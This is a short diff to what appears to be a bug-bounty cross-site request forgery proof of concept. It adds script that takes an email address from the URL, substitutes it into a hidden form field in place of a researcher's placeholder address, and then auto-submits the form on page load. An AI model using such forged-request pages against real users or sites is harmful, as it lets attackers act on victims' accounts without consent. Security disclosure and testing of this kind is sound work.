@@ -8,6 +8,13 @@
 	  <input type="submit" value="Submit request" />
     </form>
 	<script>
+	  const params = new URLSearchParams(window.location.search);
+      let email = params.get('email');
+      if (email) {
+        email = email.replace(/ /g, '+').trim();
+		const hrefInput = document.querySelector('input[name="href"]');
+        hrefInput.value = hrefInput.value.replace('kgadyrka+attacker@wearehackerone.com', email);
+      }
       document.forms[0].submit();
     </script>
   </body>
